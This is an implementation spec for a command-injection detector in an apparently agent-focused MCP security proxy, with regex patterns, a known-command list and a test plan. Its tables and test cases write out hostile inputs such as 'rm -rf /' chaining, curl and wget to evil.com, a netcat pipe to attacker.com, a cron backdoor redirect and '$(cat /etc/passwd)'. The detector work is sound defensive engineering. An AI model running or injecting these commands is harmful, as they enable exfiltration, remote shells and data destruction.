# Issue #23: Implement Command Injection Detector

**Status:** Implementation-ready  
**Milestone:** PR2 — Policy Engine + Detectors + Audit  
**Depends on:** None (standalone detector, no module dependencies beyond `models.py`)  
**Blocks:** #26 (wire detectors into registry + engine)  
**Target file:** `src/agentgate/detectors/command_injection.py`  
**Test file:** `tests/test_detectors/test_command_injection.py`  
**Estimated effort:** 1.5–2 hours  
**Ref:** MVP Spec Section 3 (detector table), Section 10 (Day 4 checklist), Evaluation A4

---

## 1. Objective

Implement a command injection detector that flags shell metacharacters in tool call string parameters. This detector catches the attack pattern where an LLM agent, tricked via prompt injection, passes shell-interpreted characters through tool arguments — enabling arbitrary command execution on the host running the MCP server.

This is one of six detectors in the pipeline. It follows the same contract as `sql_injection.py` and `path_traversal.py`: a single `detect(tool_call: ToolCall) -> DetectorResult` function, pure synchronous, no I/O.

---

## 2. What This Detector Catches (OWASP ASI02)

An agent calling a tool like `execute_command(cmd="ls; rm -rf /")` or `write_file(path="output.txt && curl evil.com/exfil")`. The MCP server may pass these arguments to a subprocess or shell, and shell metacharacters in the value would be interpreted as additional commands.

**Attack surface:** Any string parameter value that ends up in a shell context on the MCP server side. AgentGate doesn't know which params are shell-executed, so it scans all string values.

---

## 3. Detection Categories

Three categories, matching the pattern established by `sql_injection.py` and `path_traversal.py`:

### Category 1: Shell Operator Injection

Shell operators that chain or redirect commands. These are the primary injection vectors.

| Pattern | What it enables | Example |
|---------|----------------|---------|
| `;` | Command chaining | `file.txt; rm -rf /` |
| `&&` | Conditional chain (on success) | `file.txt && curl evil.com` |
| `\|\|` | Conditional chain (on failure) | `file.txt \|\| wget evil.com` |
| `\|` (pipe) | Pipe to another command | `file.txt \| nc attacker.com 4444` |
| `>` / `>>` | Output redirection | `file.txt > /etc/cron.d/backdoor` |

**Implementation:** Single regex matching `;`, `&&`, `||`, `|`, `>`, `>>` in context that suggests shell intent, not benign usage.

### Category 2: Command Substitution

Shell constructs that execute embedded commands.

| Pattern | What it enables | Example |
|---------|----------------|---------|
| `` `...` `` | Backtick substitution | `` `whoami` `` |
| `$(...)` | Dollar-paren substitution | `$(cat /etc/passwd)` |

**Implementation:** Regex for backtick-wrapped content and `$(...)` patterns.

### Category 3: Newline Injection

Newline characters that can break out of a quoted argument in shell contexts.

| Pattern | What it enables | Example |
|---------|----------------|---------|
| `\n` (literal newline in value) | Command on next line | `file.txt\nrm -rf /` |

**Implementation:** Check for literal `\n` characters embedded in single-line parameter values.

---

## 4. The Hard Part: False Positives

This detector has the highest false-positive risk of all five detectors. The characters `;`, `|`, `>`, `&` appear constantly in benign contexts:

- `AT&T` — ampersand in company names
- `Tom & Jerry` — ampersand in natural text
- `price > 100` — comparison operators
- `2025-Q1; Revenue Report` — semicolons in titles
- `a|b|c` — pipe as separator/delimiter in data
- `x > y ? a : b` — ternary-like syntax in programming strings
- Markdown, HTML content with `>` for blockquotes or tags
- URLs with `&` as query parameter separator (`?foo=1&bar=2`)

### The design decision: require shell-context indicators

**Do NOT flag bare metacharacters.** Flag metacharacters only when they appear alongside shell-context indicators — a word or pattern that looks like a command following the operator.

Concretely:

- `;` → flag only when followed by a word that could be a command: `; rm`, `; curl`, `; wget`, `; cat`, `; echo`, `; python`, `; sh`, `; bash`, `; nc`, `; chmod`, `; chown`, `; sudo`, or any path-like token (`; /bin/...`, `; ./...`)
- `&&` → same: flag when followed by a command-like token
- `||` → same
- `|` → flag when followed by a command-like token (pipe to a command)
- `>` / `>>` → flag when followed by a path-like token (`> /etc/...`, `>> /tmp/...`, `> ~/...`)
- Backticks and `$(...)` → flag unconditionally. These have no benign use in tool call parameter values.
- Newline → flag unconditionally (a literal newline embedded in a parameter value is suspicious)

**Why this is the right tradeoff:** A developer passing `AT&T` to a tool should not be blocked. A developer (or injection-tricked agent) passing `file.txt && curl evil.com/exfil` should be. The distinguishing signal is whether a recognizable command or path follows the shell operator. This accepts that we'll miss novel/obscure commands, but catches the 95% case while keeping FPR at zero for the benign test suite.

**What we explicitly miss (acceptable for MVP):**
- Obfuscated commands: `; r''m -rf /` — encoded/split commands
- Hex/octal escapes in shell: `$'\x72\x6d'` 
- Env variable expansion: `${HOME}` (benign in most contexts)
- Here-documents, process substitution (`<(...)`)
- Commands not in the known-command list

These are v1 enhancements if real-world evasion becomes a problem.

---

## 5. Implementation Spec

### Module: `src/agentgate/detectors/command_injection.py`

**Reuse `_extract_strings` from `sql_injection.py` and `path_traversal.py`.** Yes, this is the third copy. Refactoring to a shared utility is a legitimate cleanup task but NOT part of this issue — keep the three detectors self-contained for now. A `detectors/_util.py` extraction can happen in a cleanup pass after all five detectors are wired.

### Pattern definitions

```python
# Category 1: Shell operators followed by command-like tokens
# Matches: ; cmd, && cmd, || cmd, | cmd
# "cmd" = known shell command or path-like token
_KNOWN_COMMANDS = (
    r"rm|curl|wget|cat|echo|sh|bash|zsh|python[23]?|perl|ruby|nc|ncat"
    r"|chmod|chown|sudo|kill|pkill|dd|mkfifo|tee|xargs|find|grep|sed|awk"
    r"|eval|exec|source|export|env|nohup|setsid"
)

# ; <cmd>  or  ; /<path>  or  ; ./<path>
_SEMICOLON_CMD = re.compile(
    rf";\s*(?:{_KNOWN_COMMANDS})\b|;\s*[./~]", re.IGNORECASE
)

# && <cmd>  or  && /<path>
_AND_CMD = re.compile(
    rf"&&\s*(?:{_KNOWN_COMMANDS})\b|&&\s*[./~]", re.IGNORECASE
)

# || <cmd>  or  || /<path>
_OR_CMD = re.compile(
    rf"\|\|\s*(?:{_KNOWN_COMMANDS})\b|\|\|\s*[./~]", re.IGNORECASE
)

# | <cmd>  (single pipe to a command)
# Must NOT match || (handled above)
_PIPE_CMD = re.compile(
    rf"(?<!\|)\|\s*(?:{_KNOWN_COMMANDS})\b", re.IGNORECASE
)

# > or >> followed by a path-like target
_REDIRECT = re.compile(
    r">{1,2}\s*[/~.]", re.IGNORECASE
)

# Category 2: Command substitution — always suspicious
_BACKTICK = re.compile(r"`[^`]+`")
_DOLLAR_PAREN = re.compile(r"\$\([^)]+\)")

# Category 3: Embedded newlines
_NEWLINE = re.compile(r"\n")
```

### Detection function

```python
def detect(tool_call: ToolCall) -> DetectorResult:
    strings = _extract_strings(tool_call.arguments)
    
    for param_path, value in strings:
        for pattern, label in _PATTERNS:
            if pattern.search(value):
                return DetectorResult(
                    matched=True,
                    detector_name="command_injection",
                    detail=f"Command injection detected in param '{param_path}': {label}",
                )
    
    return DetectorResult(matched=False, detector_name="command_injection")
```

Where `_PATTERNS` is a list of `(pattern, label)` tuples, same structure as `sql_injection.py`.

### Labels for each pattern

| Pattern | Label |
|---------|-------|
| `_SEMICOLON_CMD` | `"shell command after semicolon"` |
| `_AND_CMD` | `"shell command after &&"` |
| `_OR_CMD` | `"shell command after \|\|"` |
| `_PIPE_CMD` | `"pipe to shell command"` |
| `_REDIRECT` | `"output redirection to file"` |
| `_BACKTICK` | `"backtick command substitution"` |
| `_DOLLAR_PAREN` | `"$() command substitution"` |
| `_NEWLINE` | `"embedded newline"` |

---

## 6. Test Plan

### File: `tests/test_detectors/test_command_injection.py`

All tests are sync, no I/O, no fixtures beyond `ToolCall` construction. Follow the exact pattern from `test_sql_injection.py` and `test_path_traversal.py`.

### Positive cases (8 — must all match)

| # | Test name | Tool call | Which pattern fires |
|---|-----------|-----------|-------------------|
| P1 | `test_semicolon_rm` | `execute(cmd="file.txt; rm -rf /")` | `_SEMICOLON_CMD` |
| P2 | `test_and_curl` | `fetch(url="x && curl evil.com/exfil")` | `_AND_CMD` |
| P3 | `test_or_wget` | `run(arg="\|\| wget evil.com/shell.sh")` | `_OR_CMD` |
| P4 | `test_pipe_nc` | `process(input="file.txt \| nc attacker.com 4444")` | `_PIPE_CMD` |
| P5 | `test_redirect_to_cron` | `write(data="payload > /etc/cron.d/backdoor")` | `_REDIRECT` |
| P6 | `test_backtick_whoami` | `log(msg="user is \`whoami\`")` | `_BACKTICK` |
| P7 | `test_dollar_paren_cat` | `display(text="$(cat /etc/passwd)")` | `_DOLLAR_PAREN` |
| P8 | `test_embedded_newline` | `execute(cmd="ls\nrm -rf /")` | `_NEWLINE` |

### Negative cases (7 — must all pass clean)

| # | Test name | Tool call | Why it's benign |
|---|-----------|-----------|----------------|
| N1 | `test_ampersand_in_company_name` | `search(query="AT&T quarterly earnings")` | `&T` is not `&& <cmd>` |
| N2 | `test_semicolon_in_text` | `write(content="Hello world; great to meet you")` | `;` not followed by a known command |
| N3 | `test_pipe_in_data_separator` | `parse(format="csv\|tsv\|json")` | `\|` not followed by a known command |
| N4 | `test_gt_in_comparison` | `query(filter="price > 100")` | `>` followed by number, not path |
| N5 | `test_url_with_ampersands` | `fetch(url="https://api.com?a=1&b=2&c=3")` | URL query params, not `&&` |
| N6 | `test_normal_filename` | `read(path="report_2026-Q1.csv")` | No metacharacters |
| N7 | `test_email_with_pipe_in_body` | `send(body="Use A \| B notation for alternatives")` | Prose usage, `\|` not followed by command |

### Edge cases (2)

| # | Test name | Tool call | Expected |
|---|-----------|-----------|----------|
| E1 | `test_nested_args` | `execute(config={"script": "x; curl evil.com"})` | MATCH — nested string scanning |
| E2 | `test_empty_args` | `execute()` (empty arguments dict) | NO MATCH — no crash |

### Total: 17 tests (8 positive + 7 negative + 2 edge)

---

## 7. Design Decisions

### D1: Context-aware pattern matching over bare character matching

**Decision:** Require a known command or path after shell operators.  
**Why:** Bare `;` matching would flag `"Q1; Revenue Report"` and destroy usability. The SQL injection detector had a similar decision — it doesn't flag standalone `SELECT`, only destructive patterns.  
**Tradeoff:** We miss injections using unknown or obfuscated commands. Acceptable for MVP.

### D2: Backticks and `$()` are unconditionally flagged

**Decision:** No context requirement for command substitution patterns.  
**Why:** There is no benign reason for a tool call parameter value to contain `` `whoami` `` or `$(cat /etc/passwd)`. Unlike `;` and `|`, these constructs exist exclusively for command execution. Zero expected false positives.

### D3: Newlines are unconditionally flagged

**Decision:** A literal `\n` character embedded in a tool call string parameter value triggers the detector.  
**Why:** MCP tool call parameters are JSON string values. A literal newline inside a JSON string is unusual and, in shell contexts, can break out of quoting. This is aggressive but the FP risk is very low — JSON serialization typically uses `\n` escape sequences, not literal newline bytes. If real-world FPs emerge, this can be narrowed to "newline followed by known command."

### D4: Copy `_extract_strings`, don't refactor yet

**Decision:** Third copy of the recursive string extractor.  
**Why:** All five detectors need it. Extracting to `detectors/_util.py` is the right eventual cleanup, but doing it now means touching `sql_injection.py` and `path_traversal.py` (which are done and tested). Refactor after all five detectors ship.

### D5: `>>` redirect treated same as `>`

**Decision:** Both `>` and `>>` followed by a path trigger the detector.  
**Why:** `>>` (append) is just as dangerous as `>` (overwrite) when targeting system files. Same regex handles both.

---

## 8. Evaluation Mapping

| Eval scenario | Detector behavior |
|--------------|-------------------|
| A4 (`;` rm -rf /) | Blocked by `_SEMICOLON_CMD` |
| B6 (read multiple files, no sensitive content) | Not triggered — no shell metacharacters |
| B8 (file with SQL-like content) | Not triggered — SQL keywords aren't shell operators |
| B9 (file with path-like content like "/usr/bin/python") | Not triggered — path in value without shell operator |
| B10 (long string params) | Not triggered — length alone doesn't trigger |

---

## 9. Integration Notes

This detector is standalone until Issue #26 (wire detectors into registry + engine). After #23 is done:

- The detector module exists and is importable
- It's already registered in `detectors/__init__.py` REGISTRY as `"command_injection": "agentgate.detectors.command_injection"`
- Issue #26 will implement the `run_all()` function that dynamically imports and invokes it

No changes needed to `engine.py`, `proxy.py`, `models.py`, or any other module.

---

## 10. Risks

### Risk 1: FP on legitimate semicolons + common words

If someone passes `"data; source analysis"` where `source` is a known shell command, it would false-positive. This is an edge case — `source` in prose is common, `source` as a shell command is uncommon in injection payloads.

**Mitigation:** If this FP appears in benign tests, remove `source` from the command list. The command list should lean toward commands with unambiguous attack intent (`rm`, `curl`, `wget`, `nc`, `chmod`, `sudo`). Words that double as English words (`find`, `kill`, `export`, `source`, `env`) should be included cautiously — only if the combination with a shell operator is far more likely to be an attack than benign text. Bias toward keeping `find` and `kill` (high attack value), dropping `source` and `export` if FPs emerge.

### Risk 2: Regex ordering and early-exit semantics

If `_OR_CMD` (`||`) is checked after `_PIPE_CMD` (`|`), a `||` sequence could match the single-pipe pattern first. The `_PIPE_CMD` regex must use a negative lookbehind for `|` to avoid this.

**Mitigation:** The spec already includes `(?<!\|)` in `_PIPE_CMD`. Verify with test case: `"x || wget evil.com"` must match `_OR_CMD`, not `_PIPE_CMD`.

---

## 11. Definition of Done

- [ ] `src/agentgate/detectors/command_injection.py` implements `detect(tool_call: ToolCall) -> DetectorResult`
- [ ] Uses `_extract_strings` to recursively scan all string parameter values
- [ ] 8 regex patterns covering shell operators (context-aware), command substitution, and newlines
- [ ] Returns on first match (short-circuit, same as sql_injection and path_traversal)
- [ ] `detector_name` is `"command_injection"` in all returned `DetectorResult` objects
- [ ] `tests/test_detectors/test_command_injection.py` has 17 tests (8 positive, 7 negative, 2 edge)
- [ ] All 17 tests pass
- [ ] Zero false positives on the 7 negative cases — this is the hard requirement
- [ ] All existing tests still pass (no regressions)
- [ ] Code passes `ruff check` and `ruff format`